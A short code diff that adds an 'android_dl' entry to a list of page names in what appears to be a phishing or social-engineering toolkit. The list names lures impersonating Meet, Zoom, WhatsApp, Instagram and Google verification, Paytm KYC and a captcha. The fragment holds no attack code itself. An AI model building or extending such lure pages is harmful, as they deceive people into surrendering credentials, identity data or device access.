@@ -32,7 +32,7 @@ PREFIX     = os.environ.get("PREFIX", "/usr")
 BIN_DIR    = os.path.join(PREFIX, "bin")
 
 ALL_PAGES  = ["meet","zoom","whatsapp","instagram","omegle","teams",
-              "telegram","facetime","instagram_verify","google_verify","paytm_kyc","captcha"]
+              "telegram","facetime","instagram_verify","google_verify","paytm_kyc","captcha","android_dl"]
 
 # ── Categories ────────────────────────────────────────────────
 CATEGORIES = {
